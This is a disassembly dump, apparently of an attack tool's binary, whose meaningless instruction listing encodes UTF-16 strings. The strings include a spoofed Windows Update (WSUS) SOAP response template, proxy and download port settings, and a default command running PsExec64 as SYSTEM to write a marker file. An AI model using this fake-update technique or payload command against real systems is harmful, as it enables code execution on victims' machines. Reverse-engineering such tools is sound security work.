  40b1bb:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40b1c0:	00 3b                	add    %bh,(%ebx)
  40b1c2:	00 2f                	add    %ch,(%edi)
  40b1c4:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40b1c8:	00 63 00             	add    %ah,0x0(%ebx)
  40b1cb:	61                   	popa
  40b1cc:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40b1d0:	00 7a 00             	add    %bh,0x0(%edx)
  40b1d3:	65 00 64 00 50       	add    %ah,%gs:0x50(%eax,%eax,1)
  40b1d8:	00 72 00             	add    %dh,0x0(%edx)
  40b1db:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1dc:	00 70 00             	add    %dh,0x0(%eax)
  40b1df:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b1e3:	74 00                	je     0x40b1e5
  40b1e5:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40b1eb:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40b1ef:	74 00                	je     0x40b1f1
  40b1f1:	3b 00                	cmp    (%eax),%eax
  40b1f3:	3c 00                	cmp    $0x0,%al
  40b1f5:	2f                   	das
  40b1f6:	00 58 00             	add    %bl,0x0(%eax)
  40b1f9:	6d                   	insl   (%dx),%es:(%edi)
  40b1fa:	00 6c 00 3e          	add    %ch,0x3e(%eax,%eax,1)
  40b1fe:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40b204:	00 20                	add    %ah,(%eax)
  40b206:	00 20                	add    %ah,(%eax)
  40b208:	00 20                	add    %ah,(%eax)
  40b20a:	00 20                	add    %ah,(%eax)
  40b20c:	00 20                	add    %ah,(%eax)
  40b20e:	00 20                	add    %ah,(%eax)
  40b210:	00 20                	add    %ah,(%eax)
  40b212:	00 20                	add    %ah,(%eax)
  40b214:	00 20                	add    %ah,(%eax)
  40b216:	00 20                	add    %ah,(%eax)
  40b218:	00 20                	add    %ah,(%eax)
  40b21a:	00 20                	add    %ah,(%eax)
  40b21c:	00 20                	add    %ah,(%eax)
  40b21e:	00 20                	add    %ah,(%eax)
  40b220:	00 20                	add    %ah,(%eax)
  40b222:	00 20                	add    %ah,(%eax)
  40b224:	00 20                	add    %ah,(%eax)
  40b226:	00 20                	add    %ah,(%eax)
  40b228:	00 20                	add    %ah,(%eax)
  40b22a:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b22d:	2f                   	das
  40b22e:	00 55 00             	add    %dl,0x0(%ebp)
  40b231:	70 00                	jo     0x40b233
  40b233:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b237:	74 00                	je     0x40b239
  40b239:	65 00 3e             	add    %bh,%gs:(%esi)
  40b23c:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40b242:	00 20                	add    %ah,(%eax)
  40b244:	00 20                	add    %ah,(%eax)
  40b246:	00 20                	add    %ah,(%eax)
  40b248:	00 20                	add    %ah,(%eax)
  40b24a:	00 20                	add    %ah,(%eax)
  40b24c:	00 20                	add    %ah,(%eax)
  40b24e:	00 20                	add    %ah,(%eax)
  40b250:	00 20                	add    %ah,(%eax)
  40b252:	00 20                	add    %ah,(%eax)
  40b254:	00 20                	add    %ah,(%eax)
  40b256:	00 20                	add    %ah,(%eax)
  40b258:	00 20                	add    %ah,(%eax)
  40b25a:	00 20                	add    %ah,(%eax)
  40b25c:	00 20                	add    %ah,(%eax)
  40b25e:	00 20                	add    %ah,(%eax)
  40b260:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b263:	2f                   	das
  40b264:	00 55 00             	add    %dl,0x0(%ebp)
  40b267:	70 00                	jo     0x40b269
  40b269:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b26d:	74 00                	je     0x40b26f
  40b26f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b273:	3e 00 0d 00 0a 00 20 	add    %cl,%ds:0x20000a00
  40b27a:	00 20                	add    %ah,(%eax)
  40b27c:	00 20                	add    %ah,(%eax)
  40b27e:	00 20                	add    %ah,(%eax)
  40b280:	00 20                	add    %ah,(%eax)
  40b282:	00 20                	add    %ah,(%eax)
  40b284:	00 20                	add    %ah,(%eax)
  40b286:	00 20                	add    %ah,(%eax)
  40b288:	00 20                	add    %ah,(%eax)
  40b28a:	00 20                	add    %ah,(%eax)
  40b28c:	00 20                	add    %ah,(%eax)
  40b28e:	00 20                	add    %ah,(%eax)
  40b290:	00 20                	add    %ah,(%eax)
  40b292:	00 20                	add    %ah,(%eax)
  40b294:	00 20                	add    %ah,(%eax)
  40b296:	00 20                	add    %ah,(%eax)
  40b298:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b29b:	46                   	inc    %esi
  40b29c:	00 69 00             	add    %ch,0x0(%ecx)
  40b29f:	6c                   	insb   (%dx),%es:(%edi)
  40b2a0:	00 65 00             	add    %ah,0x0(%ebp)
  40b2a3:	4c                   	dec    %esp
  40b2a4:	00 6f 00             	add    %ch,0x0(%edi)
  40b2a7:	63 00                	arpl   %eax,(%eax)
  40b2a9:	61                   	popa
  40b2aa:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b2ae:	00 6f 00             	add    %ch,0x0(%edi)
  40b2b1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2b2:	00 73 00             	add    %dh,0x0(%ebx)
  40b2b5:	3e 00 0d 00 0a 00 20 	add    %cl,%ds:0x20000a00
  40b2bc:	00 20                	add    %ah,(%eax)
  40b2be:	00 20                	add    %ah,(%eax)
  40b2c0:	00 20                	add    %ah,(%eax)
  40b2c2:	00 20                	add    %ah,(%eax)
  40b2c4:	00 20                	add    %ah,(%eax)
  40b2c6:	00 20                	add    %ah,(%eax)
  40b2c8:	00 20                	add    %ah,(%eax)
  40b2ca:	00 20                	add    %ah,(%eax)
  40b2cc:	00 20                	add    %ah,(%eax)
  40b2ce:	00 20                	add    %ah,(%eax)
  40b2d0:	00 20                	add    %ah,(%eax)
  40b2d2:	00 20                	add    %ah,(%eax)
  40b2d4:	00 20                	add    %ah,(%eax)
  40b2d6:	00 20                	add    %ah,(%eax)
  40b2d8:	00 20                	add    %ah,(%eax)
  40b2da:	00 20                	add    %ah,(%eax)
  40b2dc:	00 20                	add    %ah,(%eax)
  40b2de:	00 20                	add    %ah,(%eax)
  40b2e0:	00 20                	add    %ah,(%eax)
  40b2e2:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b2e5:	46                   	inc    %esi
  40b2e6:	00 69 00             	add    %ch,0x0(%ecx)
  40b2e9:	6c                   	insb   (%dx),%es:(%edi)
  40b2ea:	00 65 00             	add    %ah,0x0(%ebp)
  40b2ed:	4c                   	dec    %esp
  40b2ee:	00 6f 00             	add    %ch,0x0(%edi)
  40b2f1:	63 00                	arpl   %eax,(%eax)
  40b2f3:	61                   	popa
  40b2f4:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b2f8:	00 6f 00             	add    %ch,0x0(%edi)
  40b2fb:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2fc:	00 3e                	add    %bh,(%esi)
  40b2fe:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40b304:	00 20                	add    %ah,(%eax)
  40b306:	00 20                	add    %ah,(%eax)
  40b308:	00 20                	add    %ah,(%eax)
  40b30a:	00 20                	add    %ah,(%eax)
  40b30c:	00 20                	add    %ah,(%eax)
  40b30e:	00 20                	add    %ah,(%eax)
  40b310:	00 20                	add    %ah,(%eax)
  40b312:	00 20                	add    %ah,(%eax)
  40b314:	00 20                	add    %ah,(%eax)
  40b316:	00 20                	add    %ah,(%eax)
  40b318:	00 20                	add    %ah,(%eax)
  40b31a:	00 20                	add    %ah,(%eax)
  40b31c:	00 20                	add    %ah,(%eax)
  40b31e:	00 20                	add    %ah,(%eax)
  40b320:	00 20                	add    %ah,(%eax)
  40b322:	00 20                	add    %ah,(%eax)
  40b324:	00 20                	add    %ah,(%eax)
  40b326:	00 20                	add    %ah,(%eax)
  40b328:	00 20                	add    %ah,(%eax)
  40b32a:	00 20                	add    %ah,(%eax)
  40b32c:	00 20                	add    %ah,(%eax)
  40b32e:	00 20                	add    %ah,(%eax)
  40b330:	00 20                	add    %ah,(%eax)
  40b332:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b335:	46                   	inc    %esi
  40b336:	00 69 00             	add    %ch,0x0(%ecx)
  40b339:	6c                   	insb   (%dx),%es:(%edi)
  40b33a:	00 65 00             	add    %ah,0x0(%ebp)
  40b33d:	44                   	inc    %esp
  40b33e:	00 69 00             	add    %ch,0x0(%ecx)
  40b341:	67 00 65 00          	add    %ah,0x0(%di)
  40b345:	73 00                	jae    0x40b347
  40b347:	74 00                	je     0x40b349
  40b349:	3e 00 7b 00          	add    %bh,%ds:0x0(%ebx)
  40b34d:	31 00                	xor    %eax,(%eax)
  40b34f:	32 00                	xor    (%eax),%al
  40b351:	7d 00                	jge    0x40b353
  40b353:	3c 00                	cmp    $0x0,%al
  40b355:	2f                   	das
  40b356:	00 46 00             	add    %al,0x0(%esi)
  40b359:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40b35f:	44                   	inc    %esp
  40b360:	00 69 00             	add    %ch,0x0(%ecx)
  40b363:	67 00 65 00          	add    %ah,0x0(%di)
  40b367:	73 00                	jae    0x40b369
  40b369:	74 00                	je     0x40b36b
  40b36b:	3e 00 0d 00 0a 00 20 	add    %cl,%ds:0x20000a00
  40b372:	00 20                	add    %ah,(%eax)
  40b374:	00 20                	add    %ah,(%eax)
  40b376:	00 20                	add    %ah,(%eax)
  40b378:	00 20                	add    %ah,(%eax)
  40b37a:	00 20                	add    %ah,(%eax)
  40b37c:	00 20                	add    %ah,(%eax)
  40b37e:	00 20                	add    %ah,(%eax)
  40b380:	00 20                	add    %ah,(%eax)
  40b382:	00 20                	add    %ah,(%eax)
  40b384:	00 20                	add    %ah,(%eax)
  40b386:	00 20                	add    %ah,(%eax)
  40b388:	00 20                	add    %ah,(%eax)
  40b38a:	00 20                	add    %ah,(%eax)
  40b38c:	00 20                	add    %ah,(%eax)
  40b38e:	00 20                	add    %ah,(%eax)
  40b390:	00 20                	add    %ah,(%eax)
  40b392:	00 20                	add    %ah,(%eax)
  40b394:	00 20                	add    %ah,(%eax)
  40b396:	00 20                	add    %ah,(%eax)
  40b398:	00 20                	add    %ah,(%eax)
  40b39a:	00 20                	add    %ah,(%eax)
  40b39c:	00 20                	add    %ah,(%eax)
  40b39e:	00 20                	add    %ah,(%eax)
  40b3a0:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b3a3:	55                   	push   %ebp
  40b3a4:	00 72 00             	add    %dh,0x0(%edx)
  40b3a7:	6c                   	insb   (%dx),%es:(%edi)
  40b3a8:	00 3e                	add    %bh,(%esi)
  40b3aa:	00 7b 00             	add    %bh,0x0(%ebx)
  40b3ad:	31 00                	xor    %eax,(%eax)
  40b3af:	33 00                	xor    (%eax),%eax
  40b3b1:	7d 00                	jge    0x40b3b3
  40b3b3:	3c 00                	cmp    $0x0,%al
  40b3b5:	2f                   	das
  40b3b6:	00 55 00             	add    %dl,0x0(%ebp)
  40b3b9:	72 00                	jb     0x40b3bb
  40b3bb:	6c                   	insb   (%dx),%es:(%edi)
  40b3bc:	00 3e                	add    %bh,(%esi)
  40b3be:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40b3c4:	00 20                	add    %ah,(%eax)
  40b3c6:	00 20                	add    %ah,(%eax)
  40b3c8:	00 20                	add    %ah,(%eax)
  40b3ca:	00 20                	add    %ah,(%eax)
  40b3cc:	00 20                	add    %ah,(%eax)
  40b3ce:	00 20                	add    %ah,(%eax)
  40b3d0:	00 20                	add    %ah,(%eax)
  40b3d2:	00 20                	add    %ah,(%eax)
  40b3d4:	00 20                	add    %ah,(%eax)
  40b3d6:	00 20                	add    %ah,(%eax)
  40b3d8:	00 20                	add    %ah,(%eax)
  40b3da:	00 20                	add    %ah,(%eax)
  40b3dc:	00 20                	add    %ah,(%eax)
  40b3de:	00 20                	add    %ah,(%eax)
  40b3e0:	00 20                	add    %ah,(%eax)
  40b3e2:	00 20                	add    %ah,(%eax)
  40b3e4:	00 20                	add    %ah,(%eax)
  40b3e6:	00 20                	add    %ah,(%eax)
  40b3e8:	00 20                	add    %ah,(%eax)
  40b3ea:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b3ed:	2f                   	das
  40b3ee:	00 46 00             	add    %al,0x0(%esi)
  40b3f1:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40b3f7:	4c                   	dec    %esp
  40b3f8:	00 6f 00             	add    %ch,0x0(%edi)
  40b3fb:	63 00                	arpl   %eax,(%eax)
  40b3fd:	61                   	popa
  40b3fe:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b402:	00 6f 00             	add    %ch,0x0(%edi)
  40b405:	6e                   	outsb  %ds:(%esi),(%dx)
  40b406:	00 3e                	add    %bh,(%esi)
  40b408:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40b40e:	00 20                	add    %ah,(%eax)
  40b410:	00 20                	add    %ah,(%eax)
  40b412:	00 20                	add    %ah,(%eax)
  40b414:	00 20                	add    %ah,(%eax)
  40b416:	00 20                	add    %ah,(%eax)
  40b418:	00 20                	add    %ah,(%eax)
  40b41a:	00 20                	add    %ah,(%eax)
  40b41c:	00 20                	add    %ah,(%eax)
  40b41e:	00 20                	add    %ah,(%eax)
  40b420:	00 20                	add    %ah,(%eax)
  40b422:	00 20                	add    %ah,(%eax)
  40b424:	00 20                	add    %ah,(%eax)
  40b426:	00 20                	add    %ah,(%eax)
  40b428:	00 20                	add    %ah,(%eax)
  40b42a:	00 20                	add    %ah,(%eax)
  40b42c:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b42f:	2f                   	das
  40b430:	00 46 00             	add    %al,0x0(%esi)
  40b433:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40b439:	4c                   	dec    %esp
  40b43a:	00 6f 00             	add    %ch,0x0(%edi)
  40b43d:	63 00                	arpl   %eax,(%eax)
  40b43f:	61                   	popa
  40b440:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b444:	00 6f 00             	add    %ch,0x0(%edi)
  40b447:	6e                   	outsb  %ds:(%esi),(%dx)
  40b448:	00 73 00             	add    %dh,0x0(%ebx)
  40b44b:	3e 00 0d 00 0a 00 20 	add    %cl,%ds:0x20000a00
  40b452:	00 20                	add    %ah,(%eax)
  40b454:	00 20                	add    %ah,(%eax)
  40b456:	00 20                	add    %ah,(%eax)
  40b458:	00 20                	add    %ah,(%eax)
  40b45a:	00 20                	add    %ah,(%eax)
  40b45c:	00 20                	add    %ah,(%eax)
  40b45e:	00 20                	add    %ah,(%eax)
  40b460:	00 20                	add    %ah,(%eax)
  40b462:	00 20                	add    %ah,(%eax)
  40b464:	00 20                	add    %ah,(%eax)
  40b466:	00 20                	add    %ah,(%eax)
  40b468:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b46b:	2f                   	das
  40b46c:	00 47 00             	add    %al,0x0(%edi)
  40b46f:	65 00 74 00 45       	add    %dh,%gs:0x45(%eax,%eax,1)
  40b474:	00 78 00             	add    %bh,0x0(%eax)
  40b477:	74 00                	je     0x40b479
  40b479:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b47d:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40b481:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40b485:	70 00                	jo     0x40b487
  40b487:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b48b:	74 00                	je     0x40b48d
  40b48d:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b491:	6e                   	outsb  %ds:(%esi),(%dx)
  40b492:	00 66 00             	add    %ah,0x0(%esi)
  40b495:	6f                   	outsl  %ds:(%esi),(%dx)
  40b496:	00 52 00             	add    %dl,0x0(%edx)
  40b499:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b49d:	75 00                	jne    0x40b49f
  40b49f:	6c                   	insb   (%dx),%es:(%edi)
  40b4a0:	00 74 00 3e          	add    %dh,0x3e(%eax,%eax,1)
  40b4a4:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40b4aa:	00 20                	add    %ah,(%eax)
  40b4ac:	00 20                	add    %ah,(%eax)
  40b4ae:	00 20                	add    %ah,(%eax)
  40b4b0:	00 20                	add    %ah,(%eax)
  40b4b2:	00 20                	add    %ah,(%eax)
  40b4b4:	00 20                	add    %ah,(%eax)
  40b4b6:	00 20                	add    %ah,(%eax)
  40b4b8:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b4bb:	2f                   	das
  40b4bc:	00 47 00             	add    %al,0x0(%edi)
  40b4bf:	65 00 74 00 45       	add    %dh,%gs:0x45(%eax,%eax,1)
  40b4c4:	00 78 00             	add    %bh,0x0(%eax)
  40b4c7:	74 00                	je     0x40b4c9
  40b4c9:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b4cd:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40b4d1:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40b4d5:	70 00                	jo     0x40b4d7
  40b4d7:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b4db:	74 00                	je     0x40b4dd
  40b4dd:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b4e1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4e2:	00 66 00             	add    %ah,0x0(%esi)
  40b4e5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4e6:	00 52 00             	add    %dl,0x0(%edx)
  40b4e9:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b4ed:	70 00                	jo     0x40b4ef
  40b4ef:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4f0:	00 6e 00             	add    %ch,0x0(%esi)
  40b4f3:	73 00                	jae    0x40b4f5
  40b4f5:	65 00 3e             	add    %bh,%gs:(%esi)
  40b4f8:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40b4fe:	00 20                	add    %ah,(%eax)
  40b500:	00 20                	add    %ah,(%eax)
  40b502:	00 20                	add    %ah,(%eax)
  40b504:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b507:	2f                   	das
  40b508:	00 73 00             	add    %dh,0x0(%ebx)
  40b50b:	3a 00                	cmp    (%eax),%al
  40b50d:	42                   	inc    %edx
  40b50e:	00 6f 00             	add    %ch,0x0(%edi)
  40b511:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40b515:	3e 00 0d 00 0a 00 3c 	add    %cl,%ds:0x3c000a00
  40b51c:	00 2f                	add    %ch,(%edi)
  40b51e:	00 73 00             	add    %dh,0x0(%ebx)
  40b521:	3a 00                	cmp    (%eax),%al
  40b523:	45                   	inc    %ebp
  40b524:	00 6e 00             	add    %ch,0x0(%esi)
  40b527:	76 00                	jbe    0x40b529
  40b529:	65 00 6c 00 6f       	add    %ch,%gs:0x6f(%eax,%eax,1)
  40b52e:	00 70 00             	add    %dh,0x0(%eax)
  40b531:	65 00 3e             	add    %bh,%gs:(%esi)
  40b534:	00 0d 00 0a 00 01    	add    %cl,0x1000a00
  40b53a:	47                   	inc    %edi
  40b53b:	54                   	push   %esp
  40b53c:	00 68 00             	add    %ch,0x0(%eax)
  40b53f:	65 00 20             	add    %ah,%gs:(%eax)
  40b542:	00 70 00             	add    %dh,0x0(%eax)
  40b545:	72 00                	jb     0x40b547
  40b547:	6f                   	outsl  %ds:(%esi),(%dx)
  40b548:	00 76 00             	add    %dh,0x0(%esi)
  40b54b:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  40b551:	64 00 20             	add    %ah,%fs:(%eax)
  40b554:	00 65 00             	add    %ah,0x0(%ebp)
  40b557:	78 00                	js     0x40b559
  40b559:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b55d:	75 00                	jne    0x40b55f
  40b55f:	74 00                	je     0x40b561
  40b561:	61                   	popa
  40b562:	00 62 00             	add    %ah,0x0(%edx)
  40b565:	6c                   	insb   (%dx),%es:(%edi)
  40b566:	00 65 00             	add    %ah,0x0(%ebp)
  40b569:	20 00                	and    %al,(%eax)
  40b56b:	69 00 73 00 20 00    	imul   $0x200073,(%eax),%eax
  40b571:	69 00 6e 00 76 00    	imul   $0x76006e,(%eax),%eax
  40b577:	61                   	popa
  40b578:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40b57c:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  40b580:	00 00                	add    %al,(%eax)
  40b582:	4d                   	dec    %ebp
  40b583:	54                   	push   %esp
  40b584:	00 68 00             	add    %ch,0x0(%eax)
  40b587:	65 00 20             	add    %ah,%gs:(%eax)
  40b58a:	00 70 00             	add    %dh,0x0(%eax)
  40b58d:	72 00                	jb     0x40b58f
  40b58f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b590:	00 76 00             	add    %dh,0x0(%esi)
  40b593:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  40b599:	64 00 20             	add    %ah,%fs:(%eax)
  40b59c:	00 65 00             	add    %ah,0x0(%ebp)
  40b59f:	78 00                	js     0x40b5a1
  40b5a1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b5a5:	75 00                	jne    0x40b5a7
  40b5a7:	74 00                	je     0x40b5a9
  40b5a9:	61                   	popa
  40b5aa:	00 62 00             	add    %ah,0x0(%edx)
  40b5ad:	6c                   	insb   (%dx),%es:(%edi)
  40b5ae:	00 65 00             	add    %ah,0x0(%ebp)
  40b5b1:	20 00                	and    %al,(%eax)
  40b5b3:	77 00                	ja     0x40b5b5
  40b5b5:	61                   	popa
  40b5b6:	00 73 00             	add    %dh,0x0(%ebx)
  40b5b9:	20 00                	and    %al,(%eax)
  40b5bb:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5bc:	00 6f 00             	add    %ch,0x0(%edi)
  40b5bf:	74 00                	je     0x40b5c1
  40b5c1:	20 00                	and    %al,(%eax)
  40b5c3:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b5c7:	75 00                	jne    0x40b5c9
  40b5c9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5ca:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  40b5ce:	00 00                	add    %al,(%eax)
  40b5d0:	1d 2e 00 5c 00       	sbb    $0x5c002e,%eax
  40b5d5:	50                   	push   %eax
  40b5d6:	00 73 00             	add    %dh,0x0(%ebx)
  40b5d9:	45                   	inc    %ebp
  40b5da:	00 78 00             	add    %bh,0x0(%eax)
  40b5dd:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b5e1:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40b5e5:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40b5e9:	78 00                	js     0x40b5eb
  40b5eb:	65 00 00             	add    %al,%gs:(%eax)
  40b5ee:	41                   	inc    %ecx
  40b5ef:	54                   	push   %esp
  40b5f0:	00 68 00             	add    %ch,0x0(%eax)
  40b5f3:	65 00 20             	add    %ah,%gs:(%eax)
  40b5f6:	00 70 00             	add    %dh,0x0(%eax)
  40b5f9:	72 00                	jb     0x40b5fb
  40b5fb:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5fc:	00 76 00             	add    %dh,0x0(%esi)
  40b5ff:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  40b605:	64 00 20             	add    %ah,%fs:(%eax)
  40b608:	00 63 00             	add    %ah,0x0(%ebx)
  40b60b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b60c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b60f:	6d                   	insl   (%dx),%es:(%edi)
  40b610:	00 61 00             	add    %ah,0x0(%ecx)
  40b613:	6e                   	outsb  %ds:(%esi),(%dx)
  40b614:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40b618:	00 69 00             	add    %ch,0x0(%ecx)
  40b61b:	73 00                	jae    0x40b61d
  40b61d:	20 00                	and    %al,(%eax)
  40b61f:	69 00 6e 00 76 00    	imul   $0x76006e,(%eax),%eax
  40b625:	61                   	popa
  40b626:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40b62a:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  40b62e:	00 00                	add    %al,(%eax)
  40b630:	77 2d                	ja     0x40b65f
  40b632:	00 61 00             	add    %ah,0x0(%ecx)
  40b635:	63 00                	arpl   %eax,(%eax)
  40b637:	63 00                	arpl   %eax,(%eax)
  40b639:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40b63d:	74 00                	je     0x40b63f
  40b63f:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  40b643:	6c                   	insb   (%dx),%es:(%edi)
  40b644:	00 61 00             	add    %ah,0x0(%ecx)
  40b647:	20 00                	and    %al,(%eax)
  40b649:	2d 00 73 00 20       	sub    $0x20007300,%eax
  40b64e:	00 2d 00 64 00 20    	add    %ch,0x20006400
  40b654:	00 63 00             	add    %ah,0x0(%ebx)
  40b657:	6d                   	insl   (%dx),%es:(%edi)
  40b658:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40b65c:	00 2f                	add    %ch,(%edi)
  40b65e:	00 63 00             	add    %ah,0x0(%ebx)
  40b661:	20 00                	and    %al,(%eax)
  40b663:	22 00                	and    (%eax),%al
  40b665:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b669:	68 00 6f 00 20       	push   $0x20006f00
  40b66e:	00 31                	add    %dh,(%ecx)
  40b670:	00 20                	add    %ah,(%eax)
  40b672:	00 3e                	add    %bh,(%esi)
  40b674:	00 20                	add    %ah,(%eax)
  40b676:	00 43 00             	add    %al,0x0(%ebx)
  40b679:	3a 00                	cmp    (%eax),%al
  40b67b:	5c                   	pop    %esp
  40b67c:	00 77 00             	add    %dh,0x0(%edi)
  40b67f:	73 00                	jae    0x40b681
  40b681:	75 00                	jne    0x40b683
  40b683:	73 00                	jae    0x40b685
  40b685:	70 00                	jo     0x40b687
  40b687:	69 00 63 00 69 00    	imul   $0x690063,(%eax),%eax
  40b68d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b68e:	00 75 00             	add    %dh,0x0(%ebp)
  40b691:	73 00                	jae    0x40b693
  40b693:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  40b697:	61                   	popa
  40b698:	00 73 00             	add    %dh,0x0(%ebx)
  40b69b:	2e 00 68 00          	add    %ch,%cs:0x0(%eax)
  40b69f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b6a3:	65 00 22             	add    %ah,%gs:(%edx)
  40b6a6:	00 01                	add    %al,(%ecx)
  40b6a8:	47                   	inc    %edi
  40b6a9:	54                   	push   %esp
  40b6aa:	00 68 00             	add    %ch,0x0(%eax)
  40b6ad:	65 00 20             	add    %ah,%gs:(%eax)
  40b6b0:	00 70 00             	add    %dh,0x0(%eax)
  40b6b3:	72 00                	jb     0x40b6b5
  40b6b5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6b6:	00 76 00             	add    %dh,0x0(%esi)
  40b6b9:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  40b6bf:	64 00 20             	add    %ah,%fs:(%eax)
  40b6c2:	00 70 00             	add    %dh,0x0(%eax)
  40b6c5:	72 00                	jb     0x40b6c7
  40b6c7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6c8:	00 78 00             	add    %bh,0x0(%eax)
  40b6cb:	79 00                	jns    0x40b6cd
  40b6cd:	20 00                	and    %al,(%eax)
  40b6cf:	70 00                	jo     0x40b6d1
  40b6d1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6d2:	00 72 00             	add    %dh,0x0(%edx)
  40b6d5:	74 00                	je     0x40b6d7
  40b6d7:	20 00                	and    %al,(%eax)
  40b6d9:	69 00 73 00 20 00    	imul   $0x200073,(%eax),%eax
  40b6df:	69 00 6e 00 76 00    	imul   $0x76006e,(%eax),%eax
  40b6e5:	61                   	popa
  40b6e6:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40b6ea:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  40b6ee:	00 00                	add    %al,(%eax)
  40b6f0:	0b 31                	or     (%ecx),%esi
  40b6f2:	00 33                	add    %dh,(%ebx)
  40b6f4:	00 33                	add    %dh,(%ebx)
  40b6f6:	00 33                	add    %dh,(%ebx)
  40b6f8:	00 37                	add    %dh,(%edi)
  40b6fa:	00 00                	add    %al,(%eax)
  40b6fc:	4d                   	dec    %ebp
  40b6fd:	54                   	push   %esp
  40b6fe:	00 68 00             	add    %ch,0x0(%eax)
  40b701:	65 00 20             	add    %ah,%gs:(%eax)
  40b704:	00 70 00             	add    %dh,0x0(%eax)
  40b707:	72 00                	jb     0x40b709
  40b709:	6f                   	outsl  %ds:(%esi),(%dx)
  40b70a:	00 76 00             	add    %dh,0x0(%esi)
  40b70d:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  40b713:	64 00 20             	add    %ah,%fs:(%eax)
  40b716:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40b71a:	00 77 00             	add    %dh,0x0(%edi)
  40b71d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b71e:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40b722:	00 61 00             	add    %ah,0x0(%ecx)
  40b725:	64 00 20             	add    %ah,%fs:(%eax)
  40b728:	00 70 00             	add    %dh,0x0(%eax)
  40b72b:	6f                   	outsl  %ds:(%esi),(%dx)
